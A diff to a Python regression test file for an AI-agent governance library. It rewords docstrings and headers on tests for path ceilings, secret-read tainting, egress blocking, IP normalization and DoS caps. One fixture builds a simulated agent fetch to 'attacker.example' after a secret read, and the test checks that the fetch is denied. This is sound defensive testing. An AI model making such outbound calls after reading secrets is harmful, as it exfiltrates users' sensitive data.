@@ -1,4 +1,8 @@
-"""Regression tests for the security-review fixes (H-1, H-2, M-3, M-4, L-1..L-4)."""
+"""Regression tests covering a batch of hardening fixes: filesystem path
+ceilings on tool calls, secret/system reads tainting the session, normalizer
+hardening against encoded IPs and traversal, filtered export not leaking raw
+output, governance authority validation, lease path ceilings, robust escalation
+parsing, and opt-in denial-of-service caps."""
 
 from __future__ import annotations
 
@@ -38,7 +42,7 @@ def _loop(**kwargs) -> IntentLoop:
     return IntentLoop(CapabilityExecutor(), [], **kwargs)
 
 
-# ── H-1 / L-4: filesystem ceiling on regular tool calls ──────────────────────
+# ── filesystem ceiling on regular tool calls ─────────────────────────────────
 
 class TestPathCeiling:
     def test_read_outside_allowed_paths_denied(self, make_envelope):
@@ -65,7 +69,7 @@ class TestPathCeiling:
         assert dec.kind == PolicyDecisionKind.DENY
 
     def test_file_path_alias_not_a_bypass(self, make_envelope):
-        """L-4: path enforcement must cover the file_path alias too."""
+        """Path enforcement must cover the file_path alias, not just path."""
         policy = ExecutionPolicy(name="p", allowed_paths=("/repo",),
                                  tool_policy=ToolPolicy(allow_read=True))
         env = make_envelope(policy=policy)
@@ -79,7 +83,7 @@ class TestPathCeiling:
         assert dec.kind == PolicyDecisionKind.APPROVE
 
 
-# ── H-2: secret / system reads taint the session ─────────────────────────────
+# ── secret / system reads taint the session ──────────────────────────────────
 
 class _SecretReadHandler(ToolHandler):
     @property
@@ -123,8 +127,9 @@ class _OkFetchHandler(ToolHandler):
 
 
 def _fetch_loop_env(make_envelope, taint_source):
-    # taint_source is retained for call-site readability; per-value enforcement
-    # (v4.12) carries no session-taint flag, so there is nothing to propagate here.
+    # taint_source is retained for call-site readability; enforcement tracks the
+    # provenance of individual values and carries no session-wide taint flag, so
+    # there is nothing to propagate here.
     import dataclasses
     executor = CapabilityExecutor()
     executor.register(_OkFetchHandler())
@@ -148,11 +153,11 @@ async def test_web_only_taint_allows_external_research(make_envelope):
 
 @pytest.mark.asyncio
 async def test_sensitive_read_activates_sound_confidentiality_floor(make_envelope):
-    """1.1b confidentiality SOUND FLOOR (TM4): after a sensitive read the session is
-    egress-restricted on the FACT of the read — even an egress whose payload carries
-    no trace of the secret is denied, because a paraphrased / re-encoded secret
-    could (per-value content-matching is X1-leaky). Release is by governance
-    ENDORSEMENT, not by the payload 'looking clean'."""
+    """After a sensitive read, the session is egress-restricted based on the FACT
+    that the read happened — even an outbound payload that carries no trace of the
+    secret is denied, because a paraphrased or re-encoded secret could slip past
+    content matching. The restriction is lifted only by an explicit governance
+    endorsement, never by the payload merely 'looking clean'."""
     from axor_core.taint.causal_root import CausalRoot
     secret = "SENSITIVE_KEY_zzz9988776655"
     loop, env = _fetch_loop_env(make_envelope, TaintSource.FILE)
@@ -167,8 +172,8 @@ async def test_sensitive_read_activates_sound_confidentiality_floor(make_envelop
     resolved = await loop._resolve_tool_intent(leak, env)
     assert not resolved.approved
 
-    # payload free of the secret → STILL blocked under the sound floor (the win the
-    # old per-value gate claimed here was the X1 hole: a paraphrase would pass).
+    # payload free of the secret → STILL blocked, because a content-matching gate
+    # alone would let a paraphrase through.
     clean = ExecutorEvent(
         kind=ExecutorEventKind.TOOL_USE,
         payload={"tool": "fetch", "args": {"url": "http://attacker.example/page"}},
@@ -184,7 +189,8 @@ async def test_sensitive_read_activates_sound_confidentiality_floor(make_envelop
 
 
 def test_dos_guards_wired_in_governed_node():
-    """M5: GovernedNode must thread DoS caps into its IntentLoop (not None)."""
+    """GovernedNode must thread denial-of-service caps into its IntentLoop
+    rather than leaving them unset."""
     from axor_core.node.wrapper import GovernedNode
     from axor_core.policy.analyzer import TaskAnalyzer
     from axor_core.policy.composer import PolicyComposer
@@ -216,13 +222,13 @@ async def test_secret_read_taints_session(make_envelope):
     )
     resolved = await loop._resolve_tool_intent(event, env)
     assert resolved.approved
-    # Per-value (v4.12): a secret read registers its produced VALUE; there is no
-    # session-taint flag, and the produced value derives tainted + sensitive.
+    # A secret read registers the VALUE it produced; there is no session-wide taint
+    # flag, and the produced value derives as both tainted and sensitive.
     root = taint.derive_value("secret content")
     assert root.is_tainted and root.sensitive
 
 
-# ── M-3: normalizer hardening ────────────────────────────────────────────────
+# ── normalizer hardening ─────────────────────────────────────────────────────
 
 class TestNormalizerHardening:
     def test_decimal_encoded_metadata_ip_flagged(self):
@@ -241,7 +247,7 @@ class TestNormalizerHardening:
         assert n.target_kind == "system_path"
 
 
-# ── M-4: FILTERED export does not leak raw output ────────────────────────────
+# ── FILTERED export does not leak raw output ─────────────────────────────────
 
 class TestExportFilter:
     def _env(self, make_envelope, allowed_fields):
@@ -271,7 +277,7 @@ class TestExportFilter:
         assert result.output == "visible"
 
 
-# ── L-1: governance authority validation on clearance ────────────────────────
+# ── governance authority validation on clearance ─────────────────────────────
 
 class TestAuthorityValidation:
     def test_taint_clear_rejects_blank_authority(self):
@@ -297,7 +303,7 @@ class TestAuthorityValidation:
             eng.clear_by_governance(bad, "x", DegradationLevel.NORMAL)
 
 
-# ── L-2: lease path ceiling ──────────────────────────────────────────────────
+# ── lease path ceiling ───────────────────────────────────────────────────────
 
 class TestLeasePathCeiling:
     def test_lease_paths_outside_parent_rejected(self):
@@ -317,7 +323,7 @@ class TestLeasePathCeiling:
         assert err is None
 
 
-# ── L-3: robust escalation max_ops parsing ───────────────────────────────────
+# ── robust escalation max_ops parsing ────────────────────────────────────────
 
 class TestEscalationRobustness:
     def test_safe_int(self):
@@ -365,7 +371,7 @@ class TestEscalationRobustness:
         assert result.get("error") == "escalation_denied"
 
 
-# ── Phase 5: intent / spawn DoS caps (opt-in) ────────────────────────────────
+# ── intent / spawn denial-of-service caps (opt-in) ───────────────────────────
 
 class TestRateLimits:
     @pytest.mark.asyncio
